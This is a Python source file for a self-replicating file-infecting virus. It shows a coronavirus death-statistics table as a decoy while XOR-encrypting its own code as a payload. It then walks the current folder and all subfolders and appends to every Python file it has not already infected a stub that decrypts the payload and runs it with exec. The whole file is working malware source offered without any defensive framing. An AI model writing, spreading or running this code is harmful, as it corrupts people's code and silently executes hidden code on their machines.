import os
import random
import string

def generate_key(length_of_file):
        # This generates a key in the length of the file to be encrypted which contains random numerical and char values
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length_of_file))

def encrypt():
        with open(os.path.basename(__file__)) as original_file:
        # This encrypts the file from the line 22 
        # encrypted_content contains generated key and and encrypted file
                content = original_file.read()
                content = "\n".join(content.splitlines()[22:])
                key = generate_key(len(content))
                encrypted_content = "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(content, key)])
                encrypted_content += key
        return encrypted_content.encode()

encrypted_file = encrypt()      # This encrypted_file is payload which will be executed in every infected file after decrypted



import os
import random
import string
import requests
import json

def get_corona_information():
        # This function gets latest coronovirus information of countries
        # then, sorts  with respect to the number of deaths
        # and print top 10
        try:
                corona_json = requests.get("https://coronavirus-tracker-api.herokuapp.com/v2/locations", timeout=10).json()
        except:
                print("Could not get corono information from API")
                return
        print(" "*20, "--- TOP 10 COUNTRIES WHERE CORONOVIRUS TOOK THE MOST LIVES ---")
        print("{: >35} | {: >10} | {: >10} | {: >10} ".format("COUNTRY", "DEATHS", "RECOVERED", "CONFIRMED"))
        data = []
        for item in corona_json["locations"]:
                data.append([item["country"], item["latest"]["deaths"],
                                item["latest"]["recovered"], item["latest"]["confirmed"]])
        data.sort(key = lambda l: l[1], reverse=True)
        for row in data[:10]:
                print("{: >35} | {: >10} | {: >10} | {: >10} ".format(*row))


if __name__ == "__main__":
        # Firstly, codes shows coronavirus information 
        # prepares code which will be injected to python files under the current_file_path 
        # and all python files under subdirectories of current_file_path
        current_file_path = os.path.abspath(os.path.basename(__file__))  # gets absolute path of running file
        get_corona_information()
        # In injected code, there is a decrypt function 
        # which takes decoded encrypted file(contains key and payload) 
        # split it into key and encrypted payload
        # XOR them, and finally return decrypted payload
        # also there is a comment to mark the file injected
        injected_code = """
# already_injected
def decrypt(encrypted_content):
        length = int(len(encrypted_content)/2)
        key = encrypted_content[length:]
        content = encrypted_content[:length]
        decrypted_content =  "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(content, key)])
        return decrypted_content
encrypted_file = {encrypted_payload}
payload = decrypt(encrypted_file.decode())
exec(payload)
        """.format(encrypted_payload = encrypted_file )
        for root, dirs, files in os.walk(os.path.dirname(current_file_path)):
                for file in files:
                        if file.endswith('.py'):  # The virus will be injected to only python files
                                with open(os.path.join(root, file), "r+") as inject_to_file:
                                        if "already_injected" not in inject_to_file.read():  # checks whether the file is already injected
                                                inject_to_file.write(injected_code)



